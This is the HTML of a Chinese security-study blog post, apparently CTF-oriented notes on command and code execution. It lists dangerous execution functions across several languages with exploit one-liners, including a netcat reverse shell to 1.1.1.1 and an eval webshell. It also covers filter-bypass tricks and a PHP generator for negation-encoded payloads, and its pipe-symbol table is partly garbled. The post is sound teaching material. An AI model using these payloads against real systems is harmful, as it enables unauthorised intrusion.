@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>命令执行代码执行 | 胡萝卜的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="命令执行对象：操作系统命令 攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的  危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system() 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中 未对特殊字符（如管道符 |、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行代码执行">
+<meta property="og:url" content="https://justacarrot114.github.io/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="胡萝卜的博客">
+<meta property="og:description" content="命令执行对象：操作系统命令 攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的  危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system() 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中 未对特殊字符（如管道符 |、">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-05-23T14:24:33.000Z">
+<meta property="article:modified_time" content="2026-05-24T00:57:27.243Z">
+<meta property="article:author" content="car5ot">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="胡萝卜的博客" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">胡萝卜的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+</nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><input type="hidden" name="sitesearch" value="https://justacarrot114.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-命令执行代码执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time class="dt-published" datetime="2026-05-23T14:24:33.000Z" itemprop="datePublished">2026-05-23</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>►<a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      命令执行代码执行
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>对象：操作系统命令</p>
+<p>攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的</p>
+<ol>
+<li><strong>危险的</strong>系统命令执行<strong>函数</strong>，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system()</li>
+<li><strong>输入的数据</strong>未被妥善隔离，而是被<strong>直接作为命令的一部分</strong>，<strong>拼接</strong>到待执行的命令字符串中</li>
+<li><strong>未对特殊字符</strong>（如管道符 |、分号 ;、命令分隔符）进行<strong>转义或过滤</strong>，导致恶意指令被成功注入</li>
+</ol>
+<h4 id="PHP-命令执行核心函数"><a href="#PHP-命令执行核心函数" class="headerlink" title="PHP 命令执行核心函数"></a>PHP 命令执行核心函数</h4><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险说明</th>
+<th align="center">典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>system()</code></td>
+<td align="center">执行外部命令，并直接输出结果</td>
+<td align="center">直接执行系统命令，参数可控时可直接执行任意命令</td>
+<td align="center"><code>system($_GET[&#39;cmd&#39;]);</code> 直接 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>exec()</code></td>
+<td align="center">执行外部命令，返回结果最后一行</td>
+<td align="center">可通过第二个参数获取完整输出，参数可控即 RCE</td>
+<td align="center"><code>exec(&quot;ping &quot;.$_GET[&#39;ip&#39;]);</code> 命令拼接注入</td>
+</tr>
+<tr>
+<td align="center"><code>shell_exec()</code></td>
+<td align="center">执行外部命令，以字符串返回全部输出</td>
+<td align="center">等价于反引号 &#96;&#96;&#96;，参数可控直接 RCE</td>
+<td align="center"><code>$output = shell_exec(&quot;ls &quot;.$_GET[&#39;dir&#39;]);</code></td>
+</tr>
+<tr>
+<td align="center"><code>passthru()</code></td>
+<td align="center">执行外部命令，原样输出二进制结果</td>
+<td align="center">常用于执行带输出的命令（如反弹 shell），参数可控即 RCE</td>
+<td align="center"><code>passthru(&quot;nc -e /bin/sh 1.1.1.1 443&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>popen()</code></td>
+<td align="center">打开进程管道，执行命令并返回文件指针</td>
+<td align="center">可通过管道读写命令输出，参数可控即 RCE</td>
+<td align="center"><code>$handle = popen(&quot;id&quot;, &quot;r&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>proc_open()</code></td>
+<td align="center">执行命令并创建进程管道，支持更复杂的 IO 控制</td>
+<td align="center">功能极强，参数可控可实现任意命令执行、管道通信</td>
+<td align="center">复杂命令执行、无回显 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>pcntl_exec()</code></td>
+<td align="center">在当前进程空间执行指定程序</td>
+<td align="center">需 pcntl 扩展，参数可控可执行任意程序</td>
+<td align="center">Linux 环境下的命令执行</td>
+</tr>
+<tr>
+<td align="center">&#96;&#96;&#96;（反引号）</td>
+<td align="center">执行反引号内的系统命令，返回输出</td>
+<td align="center">语法糖（更简洁的写法），等价于<code>shell_exec()</code>，极易被忽略</td>
+<td align="center"><code>$output = </code>whoami<code>;</code></td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">把字符串作为 PHP 代码执行</td>
+<td align="center"><strong>代码执行（非系统命令）</strong>，参数可控可执行任意 PHP 代码</td>
+<td align="center"><code>eval($_GET[&#39;code&#39;]);</code> 一句话木马</td>
+</tr>
+<tr>
+<td align="center"><code>assert()</code></td>
+<td align="center">检查断言是否为 FALSE，旧版本可执行代码</td>
+<td align="center">PHP &lt; 7.0 中<code>assert($str)</code>可执行代码，存在 RCE 风险</td>
+<td align="center">旧版本 PHP 的代码注入</td>
+</tr>
+<tr>
+<td align="center"><code>call_user_func()</code></td>
+<td align="center">调用第一个参数作为回调函数</td>
+<td align="center">若函数名 &#x2F; 参数可控，可调用任意危险函数（如<code>system</code>）</td>
+<td align="center"><code>call_user_func(&quot;system&quot;, &quot;id&quot;);</code></td>
+</tr>
+<tr>
+<td align="center"><code>array_map()</code></td>
+<td align="center">将自定义函数作用到数组每个元素</td>
+<td align="center">可传入危险函数（如<code>system</code>）实现批量命令执行</td>
+<td align="center"><code>array_map(&quot;system&quot;, array(&quot;id&quot;, &quot;whoami&quot;));</code></td>
+</tr>
+<tr>
+<td align="center"><code>preg_replace()</code></td>
+<td align="center">正则搜索替换</td>
+<td align="center">PHP &lt; 5.5 中使用<code>/e</code>修饰符时，会执行替换字符串中的 PHP 代码</td>
+<td align="center"><code>preg_replace(&quot;/test/e&quot;, $_GET[&#39;code&#39;], &quot;test&quot;);</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="Python-命令执行核心函数"><a href="#Python-命令执行核心函数" class="headerlink" title="Python 命令执行核心函数"></a>Python 命令执行核心函数</h4><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险说明</th>
+<th align="center">典型利用场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>os.system()</code></td>
+<td align="center">执行系统命令，返回退出状态码</td>
+<td align="center">直接执行命令，无输出捕获，参数可控即 RCE</td>
+<td align="center"><code>os.system(&quot;whoami&quot;)</code></td>
+</tr>
+<tr>
+<td align="center"><code>os.popen()</code></td>
+<td align="center">执行命令并返回文件对象，可读取输出</td>
+<td align="center">可获取命令完整输出，参数可控即 RCE</td>
+<td align="center"><code>output = os.popen(&quot;id&quot;).read()</code></td>
+</tr>
+<tr>
+<td align="center"><code>subprocess.run()</code></td>
+<td align="center">推荐的子进程执行函数，支持复杂参数</td>
+<td align="center">功能极强，<code>shell=True</code>时参数可控可直接 RCE</td>
+<td align="center"><code>subprocess.run(&quot;id&quot;, shell=True)</code></td>
+</tr>
+<tr>
+<td align="center"><code>subprocess.Popen()</code></td>
+<td align="center">更底层的子进程创建函数，支持管道</td>
+<td align="center">可实现无回显 RCE、反弹 shell，参数可控即 RCE</td>
+<td align="center">复杂命令执行、提权</td>
+</tr>
+<tr>
+<td align="center"><code>commands.getstatusoutput()</code></td>
+<td align="center">执行命令，返回状态码 + 输出</td>
+<td align="center">Python 2 常用，等价于<code>os.popen</code>，参数可控即 RCE</td>
+<td align="center">Python 2 环境的命令执行</td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">执行字符串形式的 Python 表达式</td>
+<td align="center">代码执行，参数可控可执行任意 Python 代码</td>
+<td align="center"><code>eval(&quot;__import__(&#39;os&#39;).system(&#39;id&#39;)&quot;)</code></td>
+</tr>
+<tr>
+<td align="center"><code>exec()</code></td>
+<td align="center">执行动态生成的 Python 代码</td>
+<td align="center">功能比<code>eval</code>更强，可执行多行代码，参数可控即 RCE</td>
+<td align="center"><code>exec(&quot;import os; os.system(&#39;id&#39;)&quot;)</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="其他语言常见命令执行函数"><a href="#其他语言常见命令执行函数" class="headerlink" title="其他语言常见命令执行函数"></a>其他语言常见命令执行函数</h4><h5 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>Runtime.getRuntime().exec()</code></td>
+<td align="center">执行系统命令</td>
+<td align="center">直接 RCE，参数可控即可执行任意命令</td>
+</tr>
+<tr>
+<td align="center"><code>ProcessBuilder.start()</code></td>
+<td align="center">启动子进程执行命令</td>
+<td align="center">等价于<code>Runtime.exec()</code>，参数可控即 RCE</td>
+</tr>
+</tbody></table>
+<h5 id="C-C"><a href="#C-C" class="headerlink" title="C&#x2F;C++"></a>C&#x2F;C++</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>system()</code></td>
+<td align="center">执行系统命令</td>
+<td align="center">直接 RCE，参数可控即可执行任意命令</td>
+</tr>
+<tr>
+<td align="center"><code>popen()</code></td>
+<td align="center">执行命令并打开管道</td>
+<td align="center">可读写命令输出，参数可控即 RCE</td>
+</tr>
+</tbody></table>
+<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">核心功能</th>
+<th align="center">安全风险</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>child_process.exec()</code></td>
+<td align="center">执行系统命令，返回输出</td>
+<td align="center">参数可控直接 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>child_process.spawn()</code></td>
+<td align="center">启动子进程执行命令</td>
+<td align="center">支持管道，参数可控即 RCE</td>
+</tr>
+<tr>
+<td align="center"><code>eval()</code></td>
+<td align="center">执行 JavaScript 代码</td>
+<td align="center">代码执行，可调用<code>child_process</code>实现 RCE</td>
+</tr>
+</tbody></table>
+<h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>对象：编程语言代码</p>
+<p><strong>「任意代码执行 (Arbitrary Code Execution,ACE)」</strong> 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。<br>在此基础上我们将通过网络触发任意代码执行的能力通常称为 <strong>「远程代码执行 (RCE,Remote Code Execution,RCE)」</strong>。</p>
+<p>程序错误地将不可信的用户输入当作“合法代码”执行，导致攻击者能够注入并运行恶意代码</p>
+<ol>
+<li>存在可执行动态代码的<strong>危险函数</strong>，例如PHP的eval()、assert()或Python的exec()</li>
+<li>用户的<strong>输入数据</strong>未被净化，直接进入了代码执行流程，<strong>成为了执行代码的一部分</strong></li>
+<li>程序<strong>未对用户输入进行严格的检查、转义或过滤</strong>，允许包含恶意代码的负载注入</li>
+</ol>
+<h3 id="常见："><a href="#常见：" class="headerlink" title="常见："></a>常见：</h3><table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">功能与安全风险说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">assert()</td>
+<td align="center">检查一个断言是否为 FALSE，旧版本中可执行代码，存在安全隐患。</td>
+</tr>
+<tr>
+<td align="center">call_user_func()</td>
+<td align="center">把第一个参数作为回调函数调用，若参数可控则可能导致代码注入。</td>
+</tr>
+<tr>
+<td align="center">array_map()</td>
+<td align="center">将用户自定义函数作用到数组中的每个值上，滥用可能导致批量执行。</td>
+</tr>
+<tr>
+<td align="center">preg_replace()</td>
+<td align="center">执行正则表达式搜索和替换，当使用 &#x2F;e 修饰符时允许代码执行。</td>
+</tr>
+</tbody></table>
+<h2 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h2><h4 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h4><table>
+<thead>
+<tr>
+<th align="center">管道符</th>
+<th align="center">实例</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>;</code></td>
+<td align="center"><code>A;B</code></td>
+<td align="center">无论真假，A 与 B 都执行</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;</code></td>
+<td align="center"><code>A&amp;B</code></td>
+<td align="center">无论真假，A 与 B 都执行</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;&amp;</code></td>
+<td align="center"><code>A&amp;&amp;B</code></td>
+<td align="center">A 为真时才执行 B，否则只执行 A</td>
+</tr>
+<tr>
+<td align="center">&#96;</td>
+<td align="center">&#96;</td>
+<td align="center">&#96;A</td>
+</tr>
+<tr>
+<td align="center">&#96;</td>
+<td align="center"></td>
+<td align="center">&#96;</td>
+</tr>
+</tbody></table>
+<hr>
+<h4 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h4><p>以下可代替空格<br>&lt;       &lt;&gt;      %20(即space)      %09(即tab)	𝐼𝐹𝑆9	${IFS}      $IFS      {cat,&#x2F;flag}</p>
+<h4 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h4><p>如cat、ls被过滤，使用\绕过<br><code>c\at</code>      <code>/flag</code>       <code>l\s</code></p>
+<h4 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//生成取反payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;<span class="comment">// 要执行的函数名</span></span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;<span class="comment">// 要执行的命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(\x7e<span class="variable">$a</span>);<span class="comment">// 对字符串取反，再URL编码</span></span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出得到的取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+</footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2026/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          文件上传
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2026/05/23/Python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Python常见漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%A7%E5%93%81/">产品</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%A7%E5%93%81/prd/">prd</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/XSS/">XSS</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/XSS/SSRF/">SSRF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/XSS/SSRF/SSTI/">SSTI</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/XSS/SSRF/SSTI/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%B8%B8/">日常</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/05/">五月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">十一月 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/05/23/%E5%A4%A7%E5%AD%A6%E7%94%9F%E6%99%BA%E8%83%BD%E6%96%87%E6%A1%A3%E7%AE%A1%E7%90%86prd/">大学生智能文档管理prd</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">命令执行代码执行</a>
+          </li>
+        
+          <li>
+            <a href="/2026/05/23/Python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/">Python常见漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/04/2025-11-04-%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">我的第一篇博客</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 car5ot<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
